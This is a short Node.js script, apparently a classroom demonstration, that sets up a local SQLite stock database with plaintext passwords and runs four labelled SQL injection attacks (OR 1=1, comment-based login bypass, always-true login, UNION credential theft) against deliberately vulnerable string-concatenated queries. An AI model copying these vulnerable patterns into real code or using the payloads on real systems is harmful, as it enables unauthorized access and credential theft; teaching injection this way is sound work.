const Database = require('better-sqlite3');
const db = new Database('nyondo_stock.db');

// Add users table (run this once)
function setupUsersTable() {
    db.exec(`
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        role TEXT DEFAULT 'attendant'
    )
    `);
    
    // Insert users if they don't exist
    const existingUsers = db.prepare('SELECT COUNT(*) as count FROM users').get();
    if (existingUsers.count === 0) {
        const insertUser = db.prepare('INSERT INTO users (username, password, role) VALUES (?, ?, ?)');
        const insertAll = db.transaction((rows) => {
            for (const r of rows) insertUser.run(...r);
        });
        insertAll([
            ['admin', 'admin123', 'admin'],
            ['fatuma', 'pass456', 'attendant'],
            ['wasswa', 'pass789', 'manager']
        ]);
        console.log('Users table created and seeded!');
    }
}

// Direct string concatenation (f-string equivalent)
function searchProduct(name) {
    const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
    console.log(`Query: ${query}`);
    try {
        const rows = db.prepare(query).all();
        console.log(`Result: ${JSON.stringify(rows, null, 2)}\n`);
        return rows;
    } catch (error) {
        console.log(`Error: ${error.message}\n`);
        return [];
    }
}

// VULNERABLE: Direct string concatenation for login
function login(username, password) {
    const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
    console.log(`Query: ${query}`);
    try {
        const row = db.prepare(query).get();
        console.log(`Result: ${JSON.stringify(row, null, 2)}\n`);
        return row;
    } catch (error) {
        console.log(`Error: ${error.message}\n`);
        return null;
    }
}

// Setting up the users table
setupUsersTable();

console.log('=== SQL INJECTION ATTACKS ===\n');

// Attack 1 - Dump all products using OR 1=1
console.log('--- ATTACK 1: Bypass product search (OR 1=1) ---');
searchProduct("' OR 1=1 --");

// Attack 2 - Login bypass with no password
console.log('--- ATTACK 2: Login bypass with comment (admin\'--) ---');
login("admin'--", "anything");

// Attack 3 - Always true login
console.log('--- ATTACK 3: Always true login (OR \'1\'=\'1\') ---');
login("' OR '1'='1", "' OR '1'='1");

// Attack 4 - UNION attack to steal user data
console.log('--- ATTACK 4: UNION attack to steal credentials ---');
searchProduct("' UNION SELECT id, username, password, role FROM users --");

db.close();